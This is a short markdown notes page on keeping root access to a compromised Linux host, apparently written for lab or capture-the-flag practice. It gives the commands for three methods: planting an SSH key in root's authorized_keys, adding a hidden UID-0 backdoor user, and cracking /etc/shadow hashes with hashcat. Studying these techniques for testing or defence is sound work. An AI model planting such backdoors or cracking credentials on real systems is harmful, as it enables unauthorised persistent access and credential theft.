---
title: Linux Persistence
draft: false
tags:
  - linux
  - persistence
  - add-user
  - ssh-keygen
---


## Plot

Let's say you have successfully compromised the target system as root. However, you might not have stable shell connection such as SSH or you might not know the password and only have reverse shell connection.

These connections are still shell but it is loud and ugly. It is also complicated to reproduce. 

 Below are several ways of maintaining persistence once gained shell as a root.


## SSH as root

This is my most recommended and preferred method of maintaining persistence.

First move to the root directory: `cd /root`

If there is not already, created **.ssh** directory: `mkdir .ssh`

Move in to **.ssh** directory: `cd .ssh`

Generate ssh key: `ssh-keygen -f mykey`

![](https://i.imgur.com/rnqmeIa.png)

Copy generated public key to **authorized_keys**: `cat mykey.pub > authorized_keys`

Now there should be these three files on your target root .ssh directory:

![](https://i.imgur.com/jAG7jeg.png)


Copy private key to local machine.

Back in your target system, change permission for **.ssh** directory and **authorized_keys** file: `chmod 700 .ssh` & `chmod 600 .ssh/authorized_keys`

![](https://i.imgur.com/UbAar54.png)

Now using the copied private key, you sign in to SSH as root: `ssh -i mykey root@10.10.10.13`

![](https://i.imgur.com/WTwCQHs.png)

## Add user
I can add whatever user I want to root group and this will allow me to escalate my privilege to root directly when I gain access to low privilege user shell.

I add user and set password using the commands below:
```bash
useradd -ou 0 -g 0 hacker-jadu
passwd hacker-jadu
```

![](https://i.imgur.com/BqerUVn.png)




Now I can switch to user **hacker-jadu** using `su hacker-jadu`:


![](https://i.imgur.com/angpxK5.png)



## Crack /etc/shadow

This method is not very recommended since you don't know how strict password policy is for your target environment.

Taking a look at **/etc/shadow** file, I can see hashed password for the previous set user **hacker-jadu**:

![](https://i.imgur.com/V5dG9C4.png)


Using hashcat, I can crack this hash which will reveal password: 

`hashcat -m 1800 hash rockyou.txt`

![](https://i.imgur.com/vf6tTDH.png)


